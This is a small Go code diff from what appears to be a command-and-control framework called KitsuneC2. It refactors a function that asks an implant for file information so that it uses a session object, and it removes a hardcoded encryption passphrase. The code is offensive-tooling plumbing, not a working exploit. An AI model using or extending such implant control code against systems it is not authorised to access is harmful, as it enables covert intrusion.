@@ -5,15 +5,13 @@ package main
 
 import (
 	"KitsuneC2/lib/communication"
-	"net"
 )
 
-func RequestFileInfo(conn net.Conn, pathToFile string) error {
+func RequestFileInfo(sess *session, pathToFile string) error {
 	req := communication.FileInfoReq{PathToFile: pathToFile}
-	err := SendEnvelopeToImplant(conn, 11, req, []byte("thisis32bitlongpassphraseimusing"))
+	err := SendEnvelopeToImplant(sess, 11, req)
 	if err != nil {
 		return err
-	} else {
-		return nil
 	}
+	return nil
 }
